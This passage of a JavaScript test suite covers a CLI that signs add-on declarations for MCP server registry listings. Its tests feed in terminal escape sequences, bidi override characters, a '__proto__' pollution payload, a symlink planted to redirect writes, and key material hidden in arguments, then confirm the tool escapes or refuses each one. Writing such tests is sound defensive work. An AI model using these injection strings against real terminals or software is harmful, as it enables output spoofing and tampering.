    assert.ok(r.json.notes.some((n) => /declared in its canonical form https:\/\/example\.com\//.test(n)));
  }, { env: ENV });
});

test('hostile listing fields: escaped in the output, refused where a declaration cannot carry them, and never a crash', async () => {
  // A remote with an escape sequence and a bidi control in the URL: a listing
  // remote is declared in its WHATWG serialization (the characters percent
  // encoded), which is what check-listing compares; here that endpoint is not served.
  const evil = `https://example.com/mcp${ESC}[31m${RLO}`;
  await scenario({ registry: baseRegistry({ [regPath()]: { body: listingFor({ version: `1.0.0${RLO}${ESC}[2J`, remotes: [{ type: 'streamable-http', url: evil }] }) } }), site: baseSite() }, [NAME, '--for-version', '1.0.1', '--key-env', 'MCP_PRIVATE_KEY', '--out', freshOut()], (r) => {
    assert.equal(r.code, 30, r.stdout + r.stderr);
    assert.match(r.stdout, /^tools_unavailable: /);
    assert.match(r.stdout, /https:\/\/example\.com\/mcp%1B\[31m%E2%80%AE/);
    assert.ok(!r.stdout.includes(ESC) && !r.stdout.includes(RLO), 'raw control characters reached the output');
    assert.match(r.stdout, /\\u202e/);
  }, { env: ENV });
  // The same in --json: valid JSON, with the characters escaped.
  await scenario({ registry: baseRegistry({ [regPath()]: { body: listingFor({ version: `1.0.0${RLO}`, remotes: [{ type: 'streamable-http', url: evil }] }) } }), site: baseSite() }, [NAME, '--for-version', '1.0.1', '--out', freshOut(), '--json'], (r) => {
    assert.equal(r.code, 30);
    assert.ok(!r.stdout.includes(RLO) && !r.stdout.includes(ESC));
    assert.equal(r.json.listing.version, `1.0.0${RLO}`, 'the value is kept whole in --json');
  });
  // A listing remote with a control character that is not https stays refused.
  await scenario({ registry: baseRegistry({ [regPath()]: { body: listingFor({ remotes: [{ type: 'streamable-http', url: `http://example.com/mcp${ESC}[2J` }] }) } }), site: baseSite() }, [NAME, '--for-version', '1.0.1', '--out', freshOut()], (r) => {
    assert.equal(r.code, 29, r.stdout + r.stderr);
    assert.match(r.stdout, /^remotes_not_declarable: /);
    assert.ok(!r.stdout.includes(ESC));
  });
  // A URL template, an unknown remote type, remotes that are not a list, a
  // publisher metadata block that is not an object, and a name that is not the one asked for.
  await scenario({ registry: baseRegistry({ [regPath()]: { body: listingFor({ remotes: [{ type: 'streamable-http', url: 'https://{tenant}.example.com/mcp', variables: {} }, { type: 'websocket', url: REMOTE }] }) } }), site: baseSite() }, [NAME, '--for-version', '1.0.1', '--out', freshOut()], (r) => {
    assert.equal(r.code, 29, r.stdout + r.stderr);
    assert.match(r.stdout, /is a URL template/);
    assert.match(r.stdout, /type is "websocket"/);
    assert.match(r.stdout, /--server-json/);
  });
  await scenario({ registry: baseRegistry({ [regPath()]: { body: listingFor({ remotes: 'https://example.com/mcp' }) } }), site: baseSite() }, [NAME, '--for-version', '1.0.1', '--out', freshOut()], (r) => {
    assert.equal(r.code, 30, r.stdout + r.stderr);
    assert.match(r.stdout, /names no streamable-http remote/);
  });
  await scenario({ registry: baseRegistry({ [regPath()]: { body: listingFor({ meta: { [PP]: 'not an object', other: { a: 1 } } }) } }), site: baseSite() }, [NAME, '--for-version', '1.0.1', '--key-env', 'MCP_PRIVATE_KEY', '--out', freshOut(), '--json'], (r) => {
    assert.equal(r.code, 0, r.stdout + r.stderr);
    assert.deepEqual(Object.keys(r.json.pointer.meta[PP]), ['addonDeclaration']);
    assert.ok(r.json.notes.some((n) => /is not a JSON object, so pointer\.json holds only the pointer/.test(n)));
  }, { env: ENV });
  await scenario({ registry: baseRegistry({ [regPath()]: { body: listingFor({ name: `com.example/other${ESC}` }) } }), site: baseSite() }, [NAME, '--for-version', '1.0.1', '--out', freshOut()], (r) => {
    assert.equal(r.code, 25, r.stdout + r.stderr);
    assert.match(r.stdout, /answered for another server name/);
    assert.ok(!r.stdout.includes(ESC));
  });
  // A publisher metadata member named "__proto__" is kept as data and changes no prototype.
  const protoListing = JSON.stringify(listingFor()).replace('"description":', `"_meta":{"${PP}":{"__proto__":{"polluted":true},"x":1}},"description":`);
  const out = freshOut();
  await scenario({ registry: baseRegistry({ [regPath()]: { body: protoListing } }), site: baseSite() }, [NAME, '--for-version', '1.0.1', '--key-env', 'MCP_PRIVATE_KEY', '--out', out], (r) => {
    assert.equal(r.code, 0, r.stdout + r.stderr);
    assert.equal({}.polluted, undefined);
  }, { env: ENV });
  const pj = fs.readFileSync(path.join(out, 'pointer.json'), 'utf8');
  assert.match(pj, /"__proto__": \{\n\s+"polluted": true/);
  assert.deepEqual(Object.keys(JSON.parse(pj)._meta[PP]), ['__proto__', 'x', 'addonDeclaration']);
  // An answer over the size limit, and one that is not JSON.
  const big = listingFor();
  big.server.description = 'x'.repeat(300000);
  await scenario({ registry: baseRegistry({ [regPath()]: { body: big } }), site: baseSite() }, [NAME, '--for-version', '1.0.1', '--out', freshOut()], (r) => {
    assert.equal(r.code, 25, r.stdout + r.stderr);
    assert.match(r.stdout, /larger than 262144 bytes/);
  });
  await scenario({ registry: baseRegistry({ [regPath()]: { body: '{"server": {"name": "com.example/weather", "name": "x"}}' } }), site: baseSite() }, [NAME, '--for-version', '1.0.1', '--out', freshOut()], (r) => {
    assert.equal(r.code, 25, r.stdout + r.stderr);
    assert.match(r.stdout, /not strict JSON/);
  });
  // A hostile tool list from the remote: two tools with one name cannot be signed.
  const plain = { name: 'get_time', description: 'The time.', inputSchema: { type: 'object' } };
  const dup = { tools: [plain, plain] };
  await scenario({ registry: baseRegistry(), site: baseSite({ [`POST ${HOST}/mcp`]: mcpServer('modern', { tools: dup.tools }) }) }, [NAME, '--for-version', '1.0.1', '--out', freshOut()], (r) => {
    assert.equal(r.code, 30, r.stdout + r.stderr);
    assert.match(r.stdout, /tool list: the list cannot be signed as it is/);
  });
});

test('listing_not_found and version_not_usable: what each refusal says', async () => {
  await scenario({ registry: {}, site: baseSite() }, [NAME, '--for-version', '1.0.1', '--out', freshOut()], (r) => {
    assert.equal(r.code, 23, r.stdout + r.stderr);
    assert.match(r.stdout, /^listing_not_found: /);
    assert.match(r.stdout, /HTTP 404/);
  });
  await scenario({ registry: baseRegistry(), site: baseSite() }, [NAME, '--out', freshOut()], (r, w) => {
    assert.equal(r.code, 28, r.stdout + r.stderr);
    assert.match(r.stdout, /give --for-version <version>, the version you are about to publish/);
    assert.match(r.stdout, /A published version cannot change in the registry/);
    assert.match(r.stdout, /as --for-version together with --no-pointer/);
    assert.equal(w.seen.length, 0, 'no request before --for-version is known');
    assert.deepEqual(w.lookups, []);
  });
  await scenario({ registry: baseRegistry(), site: baseSite() }, [NAME, '--for-version', '1.0.0', '--out', freshOut()], (r) => {
    assert.equal(r.code, 28, r.stdout + r.stderr);
    assert.match(r.stdout, /1\.0\.0 is the version the registry already lists/);
    assert.match(r.stdout, /add --no-pointer/);
  });
  await scenario({ registry: baseRegistry({ [regPath('1.0.1')]: { body: listingFor({ version: '1.0.1' }) } }), site: baseSite() }, [NAME, '--for-version', '1.0.1', '--out', freshOut()], (r) => {
    assert.equal(r.code, 28, r.stdout + r.stderr);
    assert.match(r.stdout, /already lists com\.example\/weather 1\.0\.1/);
  });
  await scenario({ registry: baseRegistry(), site: baseSite() }, [NAME, '--for-version', '1.0.1', '--no-pointer', '--out', freshOut()], (r) => {
    assert.equal(r.code, 28, r.stdout + r.stderr);
    assert.match(r.stdout, /--no-pointer makes a declaration for the version the listing already has/);
  });
  // --no-pointer for a listing that names no declaration.
  await scenario({ registry: baseRegistry(), site: baseSite() }, [NAME, '--for-version', '1.0.0', '--no-pointer', '--out', freshOut()], (r) => {
    assert.equal(r.code, 28, r.stdout + r.stderr);
    assert.match(r.stdout, /check-listing stops at no_declaration/);
  });
});

test('--no-pointer: the new declaration follows the one in force and check-listing puts it in force (exit 11)', async () => {
  const out = freshOut();
  const site = baseSite({ [`${HOST}${folder}by-hash/${hex(d1)}.json`]: { body: text(d1) }, [`${HOST}${folder}versions/1.0.0.json`]: { body: text(d2) }, [`${HOST}${folder}latest.json`]: { body: text(d2) } });
  const registry = baseRegistry({ [regPath()]: { body: listingFor({ pointerTo: d1 }) } });
  await scenario({ registry, site }, [NAME, '--for-version', '1.0.0', '--no-pointer', '--key-env', 'MCP_PRIVATE_KEY', '--out', out, '--json'], (r) => {
    assert.equal(r.code, 0, r.stdout + r.stderr);
    assert.equal(r.json.mode, 'no_pointer');
    assert.equal(r.json.previous.hash, declarationHash(d2), 'it follows the newer declaration in force');
    assert.equal(r.json.previous.checkListingState, 'verified_newer_declaration');
    assert.equal(r.json.preview.state, 'verified_newer_declaration');
    assert.equal(r.json.preview.exitCode, 11);
    assert.equal(r.json.pointer, null);
    assert.match(r.json.checkCommand, /--version 1\.0\.0 --fetch-tools --registry http:\/\/127\.0\.0\.1:\d+$/);
    // d2 is not served at its by-hash path, so a copy is added to the upload.
    assert.ok(r.json.files.some((f) => f.path.endsWith(`by-hash/${hex(d2)}.json`)));
  }, { env: ENV });
  assert.ok(!filesUnder(out).includes('pointer.json'));
  assert.match(fs.readFileSync(path.join(out, 'NEXT_STEPS.txt'), 'utf8'), /verified_newer_declaration/);
  // The site after the upload: check-listing finds the new declaration in force.
  const w2 = await world({ registry, site: uploadedSite(out, { [`${HOST}${folder}by-hash/${hex(d1)}.json`]: { body: text(d1) }, [`POST ${HOST}/mcp`]: mcpServer() }) });
  try {
    const c = await w2.run([NAME, '--registry', w2.registryUrl, '--fetch-tools', '--now', NOW, '--json'], { command: 'check-listing' });
    assert.equal(c.code, 11, c.stdout + c.stderr);
    const signed = JSON.parse(fs.readFileSync(path.join(out, `site/.well-known/addon-declaration/${NAME}/versions/1.0.0.json`), 'utf8'));
    assert.equal(c.json.inForce.hash, declarationHash(signed));
    assert.equal(c.json.chain.length, 3);
  } finally {
    await w2.close();
  }
  // Signed under another published key, the new one would be set aside: refused.
  const both = parseProofRecords(`${k.record}\n${k2.record}`).keys;
  await scenario({ registry, site, httpKeys: { keys: both, notes: [] } }, [NAME, '--for-version', '1.0.0', '--no-pointer', '--key-env', 'MCP_PRIVATE_KEY', '--out', freshOut()], (r) => {
    assert.equal(r.code, 28, r.stdout + r.stderr);
    assert.match(r.stdout, /crosses a change of key/);
  }, { env: { MCP_PRIVATE_KEY: k2.hex } });
});

test('tools_unavailable: a remote that asks for authorization leads to --tools, which then works', async () => {
  await scenario({ registry: baseRegistry(), site: baseSite({ [`POST ${HOST}/mcp`]: mcpServer('auth') }) }, [NAME, '--for-version', '1.0.1', '--key-env', 'MCP_PRIVATE_KEY', '--out', freshOut()], (r) => {
    assert.equal(r.code, 30, r.stdout + r.stderr);
    assert.match(r.stdout, /^tools_unavailable: /);
    assert.match(r.stdout, /asked for authorization/);
    assert.match(r.stdout, /prepare sends no credentials/);
    assert.match(r.stdout, /give --tools tools\.json/);
  }, { env: ENV });
  const p1 = path.join(tmp, 'page-1.json');
  const p2 = path.join(tmp, 'page-2.json');
  fs.writeFileSync(p1, JSON.stringify({ jsonrpc: '2.0', id: 1, result: { tools: [TOOLS.tools[0]], nextCursor: 'c' } }));
  fs.writeFileSync(p2, JSON.stringify({ jsonrpc: '2.0', id: 2, result: { tools: [TOOLS.tools[1]] } }));
  const seenPosts = [];
  await scenario({ registry: baseRegistry(), site: baseSite({ [`POST ${HOST}/mcp`]: (req, res) => (seenPosts.push(1), mcpServer('auth')(req, res, '{}')) }) }, [NAME, '--for-version', '1.0.1', '--key-env', 'MCP_PRIVATE_KEY', '--tools', p1, '--tools', p2, '--out', freshOut(), '--json'], (r) => {
    assert.equal(r.code, 0, r.stdout + r.stderr);
    assert.equal(r.json.tools.source, 'files');
    assert.equal(r.json.tools.pages, 2);
    assert.equal(r.json.tools.contract, tsd.contract.digest);
  }, { env: ENV });
  assert.equal(seenPosts.length, 0, 'with --tools the remote is not contacted');
});

test('--json: one object with every top level member', async () => {
  await scenario({ registry: baseRegistry(), site: baseSite() }, [NAME, '--for-version', '1.0.1', '--key-env', 'MCP_PRIVATE_KEY', '--out', freshOut(), '--json'], (r) => {
    assert.equal(r.code, 0, r.stdout + r.stderr);
    const j = r.json;
    for (const key of ['command', 'state', 'exitCode', 'reasons', 'name', 'forVersion', 'mode', 'signed', 'dryRun', 'out', 'steps', 'listing', 'keyRecord', 'signingKey', 'tools', 'previous', 'declaration', 'pointer', 'files', 'verify', 'preview', 'checkCommand', 'fetched', 'notes']) assert.ok(Object.hasOwn(j, key), key);
    assert.equal(j.command, 'prepare');
    assert.equal(j.steps.length, 9);
    assert.ok(j.steps.every((s) => s.result === 'ok'));
    assert.deepEqual(j.signingKey, { alg: 'ed25519', id: k.loaded.public.id, matches: true });
    assert.equal(j.keyRecord.keys[0].record, k.record);
    assert.ok(j.files.filter((f) => f.upload).every((f) => f.contentType === 'application/json' && f.url.startsWith(`https://${HOST}${folder}`)));
    assert.ok(j.fetched.every((f) => typeof f.url === 'string' && 'status' in f));
    assertNoSecrets(r.stdout);
  }, { env: ENV });
});

test('usage: names, versions and paths that look like key material are not used or sent', async () => {
  const hexKey = k.hex;
  for (const args of [[`com.example/${hexKey}`, '--for-version', '1.0.1'], [NAME, '--for-version', hexKey], [NAME, '--for-version', '1.0.1', '--listing-version', hexKey], [NAME, '--for-version', '1.0.1', '--out', path.join(tmp, hexKey)]]) {
    await scenario({ registry: baseRegistry(), site: baseSite() }, args, (r, w) => {
      assert.equal(r.code, 1, r.stdout + r.stderr);
      assert.equal(w.seen.length, 0);
      assertNoSecrets(r.stdout, r.stderr);
    });
  }
  await scenario({ registry: baseRegistry(), site: baseSite() }, [NAME, '--for-version', 'latest'], (r) => {
    assert.equal(r.code, 1);
    assert.match(r.stderr, /not "latest"/);
  });
  await scenario({ registry: baseRegistry(), site: baseSite() }, [NAME, '--for-version', 'CON'], (r) => {
    assert.equal(r.code, 1);
    assert.match(r.stderr, /device name on Windows/);
  });
  await scenario({ registry: baseRegistry(), site: baseSite() }, [NAME, '--for-version', '1.0.1', '--key-env', 'A', '--key-file', 'b'], (r) => {
    assert.equal(r.code, 1);
    assert.match(r.stderr, /at most one of --key-file or --key-env/);
  });
  const sj = path.join(tmp, 'server-other.json');
  fs.writeFileSync(sj, JSON.stringify({ name: NAME, version: '2.0.0' }));
  await scenario({ registry: baseRegistry(), site: baseSite() }, [NAME, '--for-version', '1.0.1', '--server-json', sj], (r, w) => {
    assert.equal(r.code, 1);
    assert.match(r.stderr, /server\.json has version "2\.0\.0", not 1\.0\.1/);
    assert.equal(w.seen.length, 0);
  });
  await scenario({ registry: baseRegistry(), site: baseSite() }, [NAME, '--for-version', '1.0.1', '--fetch-tools'], (r) => {
    assert.equal(r.code, 1);
    assert.match(r.stderr, /--fetch-tools is not an option of prepare/);
  });
});

test('prepare --help prints only its own part, within 80 columns; exit codes are new numbers and listed in help', async () => {
  const w = await world();
  try {
    let out = '';
    const code = await main(['prepare', '--help'], { stdout: { write: (s) => (out += s) }, stderr: { write: () => {} }, env: {}, deps: {} });
    assert.equal(code, 0);
    assert.equal(out, HELP_PREPARE);
    for (const line of out.split('\n')) assert.ok(line.length <= 80, `${line.length}: ${line}`);
  } finally {
    await w.close();
  }
  const verifyCodes = new Set(Object.values(STATES));
  const listingCodes = new Set(Object.values(LISTING_STATES));
  for (const [state, code] of Object.entries(PREPARE_STATES)) {
    if (code !== 0) {
      assert.ok(!verifyCodes.has(code) && !listingCodes.has(code) && code !== 1, `${state} reuses exit code ${code}`);
      assert.ok(HELP.replace(/\s+/g, ' ').includes(`${code} ${state}`), `help lists ${code} ${state}`);
    }
  }
  assert.equal(new Set(Object.values(PREPARE_STATES).filter((c) => c !== 0)).size, Object.values(PREPARE_STATES).filter((c) => c !== 0).length, 'one number per state');
  const words = HELP_PREPARE.replace(/https?:\/\/\S+/g, '');
  assert.ok(!/\s-\s|\s--\s|[\u2012-\u2015\u2212]/.test(words), 'no dash punctuation in the help');
  assert.ok(!/\b(never|guaranteed|safe|trusted|secure)\b/i.test(words), 'none of the barred words in the help');
});

// ---- review fixes ----

const readOut = (out, rel) => fs.readFileSync(path.join(out, ...rel.split('/')), 'utf8');
const SITE = `site/.well-known/addon-declaration/${NAME}/`;

test('pointer mode without --server-json: NEXT_STEPS and the output name the remotes and the tool list the new version must keep', async () => {
  const out = freshOut();
  await scenario({ registry: baseRegistry(), site: baseSite() }, [NAME, '--for-version', '1.1.0', '--key-env', 'MCP_PRIVATE_KEY', '--out', out], (r) => {
    assert.equal(r.code, 0, r.stdout + r.stderr);
    assert.match(r.stdout, /note: the declaration names the remotes of the listing of 1\.0\.0 \(streamable-http https:\/\/example\.com\/mcp\); the server\.json of 1\.1\.0 must name exactly these/);
    assert.match(r.stdout, /step 9, check: .*assuming the server\.json of 1\.1\.0 names the remotes of the listing/);
  }, { env: ENV });
  const next = readOut(out, 'NEXT_STEPS.txt');
  assert.match(next, /c\. Keep "remotes" exactly as listed for 1\.0\.0: streamable-http https:\/\/example\.com\/mcp\./);
  assert.match(next, /run prepare again with --server-json <the server\.json of 1\.1\.0> and --force/);
  assert.match(next, /d\. The tool list signed was read from https:\/\/example\.com\/mcp, the server running now\. Version 1\.1\.0 must answer tools\/list with that same list/);
  assert.match(next, /replace the object as a whole, do not merge into it/);
  assert.match(next, /check-listing com\.example\/weather --version 1\.1\.0 --fetch-tools --registry http:\/\/127\.0\.0\.1:\d+/);
  assert.match(next, /Do not upload declaration\.unsigned\.json, pointer\.json or this file\./);
  // Following the remotes step matters: a new version with another remote does not verify.
  const pointer = JSON.parse(readOut(out, 'pointer.json'));
  const moved = listingFor({ version: '1.1.0', remotes: [{ type: 'streamable-http', url: 'https://example.com/mcp/v2' }] });
  moved.server._meta = pointer._meta;
  const w2 = await world({ registry: { [regPath('1.1.0')]: { body: moved } }, site: uploadedSite(out) });
  try {
    const c = await w2.run([NAME, '--version', '1.1.0', '--registry', w2.registryUrl, '--now', NOW], { command: 'check-listing' });
    assert.equal(c.code, 18, c.stdout + c.stderr);
  } finally {
    await w2.close();
  }
  // With --server-json the remotes come from that file and step c says so.
  const sj = path.join(tmp, 'server-1.2.0.json');
  fs.writeFileSync(sj, JSON.stringify({ name: NAME, version: '1.2.0', remotes: [{ type: 'streamable-http', url: REMOTE }] }));
  const out2 = freshOut();
  await scenario({ registry: baseRegistry(), site: baseSite() }, [NAME, '--for-version', '1.2.0', '--server-json', sj, '--key-env', 'MCP_PRIVATE_KEY', '--out', out2], (r) => {
    assert.equal(r.code, 0, r.stdout + r.stderr);
    assert.ok(!/assuming the server\.json/.test(r.stdout));
  }, { env: ENV });
  assert.match(readOut(out2, 'NEXT_STEPS.txt'), /c\. Keep "remotes" as in the server\.json given to prepare/);
});

test('--force: a link in the output folder is refused, also with --force, and nothing is written outside it', async () => {
  const out = freshOut();
  const outside = fs.mkdtempSync(path.join(tmp, 'outside-'));
  fs.mkdirSync(out, { recursive: true });
  fs.symlinkSync(outside, path.join(out, 'site'), process.platform === 'win32' ? 'junction' : 'dir');
  for (const extra of [[], ['--force']]) {
    await scenario({ registry: baseRegistry(), site: baseSite() }, [NAME, '--for-version', '1.1.0', '--key-env', 'MCP_PRIVATE_KEY', '--out', out, ...extra], (r, w) => {
      assert.equal(r.code, 32, r.stdout + r.stderr);
      assert.match(r.stdout, /holds 1 symbolic link or junction \(such as site\)/);
      assert.equal(w.seen.length, 0);
    }, { env: ENV });
  }
  assert.deepEqual(filesUnder(outside), []);
});

test('--force replaces what an earlier run wrote; a failed write leaves the folder as it was', async () => {
  const out = freshOut();
  fs.mkdirSync(out, { recursive: true });
  fs.writeFileSync(path.join(out, 'mine.txt'), 'keep me');
  await scenario({ registry: baseRegistry(), site: baseSite() }, [NAME, '--for-version', '1.1.0', '--key-env', 'MCP_PRIVATE_KEY', '--out', out, '--force'], (r) => {
    assert.equal(r.code, 0, r.stdout + r.stderr);
  }, { env: ENV });
  const signed1 = filesUnder(out);
  assert.ok(signed1.includes(`${SITE}latest.json`));
  // A long version file name fails to write: nothing in the folder changes.
  const longVersion = 'é'.repeat(100);
  await scenario({ registry: baseRegistry(), site: baseSite() }, [NAME, '--for-version', longVersion, '--key-env', 'MCP_PRIVATE_KEY', '--out', out, '--force'], (r) => {
    assert.equal(r.code, 1, r.stdout + r.stderr);
    assert.match(r.stderr, /nothing was written into it/);
  }, { env: ENV });
  assert.deepEqual(filesUnder(out), signed1, 'the earlier set is whole');
  assert.ok(!fs.readdirSync(out).some((f) => f.startsWith('.prepare-')), 'no staging folder is left');
  // A signed run for another version with --force replaces the earlier set:
  // the by-hash and versions files of 1.1.0 are removed, the rest replaced.
  await scenario({ registry: baseRegistry(), site: baseSite() }, [NAME, '--for-version', '1.2.0', '--key-env', 'MCP_PRIVATE_KEY', '--out', out, '--force'], (r) => {
    assert.equal(r.code, 0, r.stdout + r.stderr);
    assert.match(r.stdout, /--force removed 2 files an earlier prepare run wrote/);
  }, { env: ENV });
  const signed2 = filesUnder(out);
  assert.ok(signed2.includes(`${SITE}versions/1.2.0.json`) && !signed2.includes(`${SITE}versions/1.1.0.json`), signed2.join(', '));
  assert.ok(signed2.includes('mine.txt'));
  assert.equal(JSON.parse(readOut(out, 'declaration.unsigned.json')).version, '1.2.0');
});

test('dry run then signed run: the dry run says the signed run needs --force; pointer notes say "would"', async () => {
  const out = freshOut();
  const withPointer = listingFor({ meta: { [PP]: { tier: 'free', addonDeclaration: { url: 'https://example.com/x', hash: `sha256:${'0'.repeat(64)}` } } } });
  await scenario({ registry: baseRegistry({ [regPath()]: { body: withPointer } }), site: baseSite() }, [NAME, '--for-version', '1.1.0', '--out', out, '--dry-run'], (r) => {
    assert.equal(r.code, 0, r.stdout + r.stderr);
    assert.match(r.stdout, /step 8, output: .*The signed run needs --force for this folder \(or another --out\)/);
    assert.match(r.stdout, /pointer\.json would replace it with the new pointer/);
    assert.match(r.stdout, /pointer\.json would keep the other publisher metadata members/);
  });
  await scenario({ registry: baseRegistry(), site: baseSite() }, [NAME, '--for-version', '1.1.0', '--out', out, '--key-env', 'MCP_PRIVATE_KEY'], (r) => {
    assert.equal(r.code, 32, r.stdout + r.stderr);
  }, { env: ENV });
});

test('hostile registry text is escaped in NEXT_STEPS.txt and pointer.json', async () => {
  const out = freshOut();
  const version = `1.0.0${ESC}]0;pwned${ESC}\\${ESC}[2J${RLO}evil`;
  const listing = listingFor({ version, meta: { [PP]: { other: `x${RLO}y` } } });
  await scenario({ registry: baseRegistry({ [regPath()]: { body: listing } }), site: baseSite() }, [NAME, '--for-version', '1.1.0', '--key-env', 'MCP_PRIVATE_KEY', '--out', out], (r) => {
    assert.equal(r.code, 0, r.stdout + r.stderr);
    assert.ok(!r.stdout.includes(ESC) && !r.stdout.includes(RLO));
  }, { env: ENV });
  for (const f of ['NEXT_STEPS.txt', 'pointer.json']) {
    const t = readOut(out, f);
    assert.ok(!t.includes(ESC) && !t.includes(RLO), `raw control characters in ${f}`);
  }
  assert.match(readOut(out, 'NEXT_STEPS.txt'), /\\u001b\]0;pwned/);
  assert.equal(JSON.parse(readOut(out, 'pointer.json'))._meta[PP].other, `x${RLO}y`, 'pointer.json decodes to the same value');
});

test('--contact and version flags: key material, also cut in pieces, is not used or sent', async () => {
  const hexKey = k.hex;
  for (const args of [
    [NAME, '--for-version', '1.0.1', '--contact', `mailto:${hexKey}@example.com`],
    [NAME, '--for-version', '1.0.1', '--contact', `https://example.com/${k.secretStrings[4]}`],
    [NAME, '--for-version', `1.0.1-${hexKey.slice(0, 32)}.${hexKey.slice(32)}`],
    [NAME, '--for-version', '1.0.1', '--listing-version', `1.0.0+${hexKey.slice(0, 32)}.${hexKey.slice(32)}`],
  ]) {
    await scenario({ registry: baseRegistry(), site: baseSite() }, args, (r, w) => {
      assert.equal(r.code, 1, r.stdout + r.stderr);
      assert.match(r.stderr, /looks like key material/);
      assert.equal(w.seen.length, 0);
      assertNoSecrets(r.stdout, r.stderr);
      assert.ok(!r.stderr.includes(hexKey.slice(0, 32)));
    });
  }
  // A git commit hash in build metadata is accepted.
  await scenario({ registry: baseRegistry(), site: baseSite() }, [NAME, '--for-version', '1.0.1+0123456789abcdef0123456789abcdef01234567', '--out', freshOut()], (r) => {
    assert.equal(r.code, 0, r.stdout + r.stderr);
  });
});

test('step 6 shows every signed value, payment included', async () => {
  const pay = path.join(tmp, 'pay.json');
  fs.writeFileSync(pay, JSON.stringify([{ network: 'eip155:84532', asset: '0x1111111111111111111111111111111111111111', payTo: '0x2222222222222222222222222222222222222222', amount: '10000' }]));
  await scenario({ registry: baseRegistry(), site: baseSite() }, [NAME, '--for-version', '1.1.0', '--payment', pay, '--contact', 'mailto:security@example.com', '--key-env', 'MCP_PRIVATE_KEY', '--out', freshOut(), '--json'], (r) => {
    assert.equal(r.code, 0, r.stdout + r.stderr);
    const s6 = r.json.steps.find((s) => s.step === 6).line;
    assert.match(s6, /payment 1 entry \(network eip155:84532, asset 0x1{40}, payTo 0x2{40}, amount 10000\)/);
    assert.match(s6, /contact mailto:security@example\.com, key by the http method at example\.com/);
    assert.equal(r.json.declaration.payment[0].payTo, '0x' + '2'.repeat(40));
    assert.deepEqual(r.json.declaration.key, { method: 'http', domain: HOST });
  }, { env: ENV });
});

test('the key location follows the previous declaration, and --no-pointer refuses a change of key location up front', async () => {
  const both = { keys: published, notes: [] };
  const dnsDecl = signDeclaration({ spec: SPEC_ID_02, name: NAME, version: '1.0.0', toolSetDigest: { spec: 'mcp-tool-set-digest/1', contract: tsd.contract.digest, extras: tsd.extras.digest }, remotes: [{ type: 'streamable-http', url: REMOTE }], issuedAt: '2026-11-18T11:00:00Z', expiresAt: '2027-05-18T10:00:00Z', key: { method: 'dns', domain: HOST } }, k.loaded);
  const registry = baseRegistry({ [regPath()]: { body: listingFor({ pointerTo: dnsDecl }) } });
  const site = baseSite({ [`${HOST}${folder}by-hash/${hex(dnsDecl)}.json`]: { body: text(dnsDecl) } });
  const out = freshOut();
  await scenario({ registry, site, httpKeys: both, dnsKeys: both }, [NAME, '--for-version', '1.0.0', '--no-pointer', '--key-env', 'MCP_PRIVATE_KEY', '--out', out, '--json'], (r) => {
    assert.equal(r.code, 0, r.stdout + r.stderr);
    assert.deepEqual(r.json.declaration.key, { method: 'dns', domain: HOST });
    assert.equal(r.json.keyRecord.method, 'dns');
    assert.equal(r.json.preview.state, 'verified_newer_declaration');
    assert.ok(r.json.notes.some((n) => /the key location follows the previous declaration/.test(n)));
  }, { env: ENV });
  assert.ok(!/pointer\.json/.test(readOut(out, 'NEXT_STEPS.txt')), 'no pointer.json in --no-pointer mode');
  await scenario({ registry, site, httpKeys: both, dnsKeys: both }, [NAME, '--for-version', '1.0.0', '--no-pointer', '--method', 'http', '--key-env', 'MCP_PRIVATE_KEY', '--out', freshOut()], (r) => {
    assert.equal(r.code, 28, r.stdout + r.stderr);
    assert.match(r.stdout, /another key location/);
    assert.match(r.stdout, /give --method dns/);
  }, { env: ENV });
  // Pointer mode: latest.json holds the dns declaration; the new one follows its location.
  await scenario({ registry: baseRegistry(), site: baseSite({ [`${HOST}${folder}latest.json`]: { body: text(dnsDecl) } }), httpKeys: both, dnsKeys: both }, [NAME, '--for-version', '1.0.1', '--key-env', 'MCP_PRIVATE_KEY', '--out', freshOut(), '--json'], (r) => {
    assert.equal(r.code, 0, r.stdout + r.stderr);
    assert.deepEqual(r.json.declaration.key, { method: 'dns', domain: HOST });
    assert.equal(r.json.previous.hash, declarationHash(dnsDecl));
  }, { env: ENV });
  // Pointer mode with --method http: linked, with a note that the link crosses a change of key location.
  await scenario({ registry: baseRegistry(), site: baseSite({ [`${HOST}${folder}latest.json`]: { body: text(dnsDecl) } }), httpKeys: both, dnsKeys: both }, [NAME, '--for-version', '1.0.1', '--method', 'http', '--key-env', 'MCP_PRIVATE_KEY', '--out', freshOut(), '--json'], (r) => {
    assert.equal(r.code, 0, r.stdout + r.stderr);
    assert.deepEqual(r.json.declaration.key, { method: 'http', domain: HOST });
    assert.ok(r.json.notes.some((n) => /crosses a change of key location/.test(n) && /--method http was given/.test(n)));
  }, { env: ENV });
});

test('latest.json is written only for a version the registry will mark latest', async () => {
  const twoVersions = {
    [regPath()]: { body: listingFor({ version: '2.0.0' }) },
    [regPath('1.0.0')]: { body: listingFor({ version: '1.0.0', isLatest: false }) },
  };
  const cases = [
    [['--listing-version', '1.0.0', '--for-version', '1.0.1'], twoVersions, false, /1\.0\.1 comes before the latest listed version 2\.0\.0/],
    [['--for-version', '1.0.0-rc.1'], baseRegistry(), false, /1\.0\.0-rc\.1 comes before the latest listed version 1\.0\.0/],
    [['--for-version', 'build-7'], baseRegistry(), false, /cannot be decided/],
    [['--for-version', '1.0.10'], baseRegistry(), true, null],
  ];
  for (const [args, registry, latest, note] of cases) {
    const out = freshOut();
    await scenario({ registry, site: baseSite() }, [NAME, ...args, '--key-env', 'MCP_PRIVATE_KEY', '--out', out, '--json'], (r) => {
      assert.equal(r.code, 0, `${args.join(' ')}: ${r.stdout}${r.stderr}`);
      assert.equal(r.json.files.some((f) => f.path.endsWith('/latest.json')), latest, args.join(' '));
      if (note) assert.ok(r.json.notes.some((n) => note.test(n)), r.json.notes.join('\n'));
      if (args.includes('--listing-version')) assert.equal(r.json.listing.latestVersion, '2.0.0');
    }, { env: ENV });
    if (!latest) assert.match(readOut(out, 'NEXT_STEPS.txt'), /No latest\.json was written/);
  }
});

test('compareVersions follows semantic version precedence', async () => {
  const { compareVersions } = await import('../lib/prepare.js');
  const order = ['1.0.0-alpha', '1.0.0-alpha.1', '1.0.0-alpha.beta', '1.0.0-beta', '1.0.0-beta.2', '1.0.0-beta.11', '1.0.0-rc.1', '1.0.0', '1.0.1', '1.10.0', '2.0.0', '18446744073709551616.0.0'];
  for (let i = 0; i < order.length; i++) {
    for (let j = 0; j < order.length; j++) assert.equal(compareVersions(order[i], order[j]), Math.sign(i - j), `${order[i]} vs ${order[j]}`);
  }
